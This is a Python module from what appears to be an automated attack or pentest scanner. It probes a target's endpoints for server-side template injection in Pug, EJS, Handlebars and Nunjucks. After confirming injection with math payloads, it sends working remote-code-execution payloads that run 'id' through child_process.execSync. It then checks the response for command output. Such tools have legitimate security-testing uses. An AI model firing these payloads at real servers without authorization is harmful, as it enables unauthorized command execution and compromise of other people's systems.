"""SSTI Scanner — Pug, EJS, Handlebars, Nunjucks"""
from core.config import SSTI_PAYLOADS, SSTI_PARAMS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_post, save_report, vuln
import urllib.parse

SSTI_ENDPOINTS = ["/", "/api/render", "/api/template", "/api/preview",
                  "/api/email", "/api/notify", "/api/generate",
                  "/api/report", "/api/invoice", "/search",
                  "/profile", "/user", "/comment", "/feedback"]

def run(target):
    print(f"\n{B2}  SSTI scan on {W}{target}{N}")
    vulns = 0; findings = []

    # Basic math detection
    print(f"\n{D}  Testing template injection (math)...{N}")
    for ep in SSTI_ENDPOINTS:
        for param in SSTI_PARAMS[:6]:
            for engine, payloads in SSTI_PAYLOADS.items():
                for payload in payloads[:2]:
                    # GET
                    url = f"{target}{ep}?{param}={urllib.parse.quote(payload)}"
                    code, hdrs, body = http_get(url, timeout=7)
                    if code == 0: continue

                    # Check for math result (7*7=49)
                    if "49" in body and payload not in body:
                        vuln("CRITICAL", f"SSTI ({engine}) via ?{param}=",
                             f"Math evaluation confirmed", url)
                        vulns += 1
                        findings.append({"type":"ssti","engine":engine,"param":param,"url":url})
                        break

                    # POST
                    data = f'{{"{param}":"{payload}"}}'
                    code, body = http_post(target + ep, data, timeout=7)
                    if code in (200, 201) and "49" in body and payload not in body:
                        vuln("CRITICAL", f"SSTI ({engine}) POST via {param}", url)
                        vulns += 1
                        findings.append({"type":"ssti_post","engine":engine,"param":param})
                        break

    # RCE payloads (only if SSTI confirmed)
    if vulns > 0:
        print(f"\n{D}  Testing RCE via SSTI...{N}")
        rce_payloads = {
            "pug": "#{process.mainModule.require('child_process').execSync('id')}",
            "ejs": "<%= process.mainModule.require('child_process').execSync('id') %>",
            "nunjucks": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        }
        for f in findings:
            if f["type"].startswith("ssti"):
                engine = f.get("engine", "generic")
                if engine in rce_payloads:
                    param = f.get("param", "name")
                    payload = rce_payloads[engine]
                    url = f"{target}/?{param}={urllib.parse.quote(payload)}"
                    code, hdrs, body = http_get(url, timeout=10)
                    if code == 200 and ("uid=" in body or "root:" in body):
                        vuln("CRITICAL", f"RCE via {engine} SSTI!",
                             "Command execution confirmed", url)
                        vulns += 1
                        findings.append({"type":"ssti_rce","engine":engine,"url":url})

    # Error-based SSTI detection
    print(f"\n{D}  Testing error-based SSTI...{N}")
    error_payloads = ["{{", "${", "<%=", "#{", "{%", "{{#"]
    for ep in SSTI_ENDPOINTS[:5]:
        for payload in error_payloads:
            url = f"{target}{ep}?name={urllib.parse.quote(payload)}"
            code, hdrs, body = http_get(url, timeout=6)
            if code == 500 and any(m in body for m in ["Template","Compile","Parse",
                                                         "SyntaxError","unexpected token",
                                                         "pug","ejs","handlebars","nunjucks"]):
                vuln("HIGH", f"Template engine error ({payload})", "Engine type revealed", url)
                vulns += 1; findings.append({"type":"ssti_error","url":url})
                break

    print(f"\n{G}  [✓] SSTI scan done — {vulns} findings{N}")
    if findings: save_report("ssti", {"target":target,"findings":findings})
    return vulns
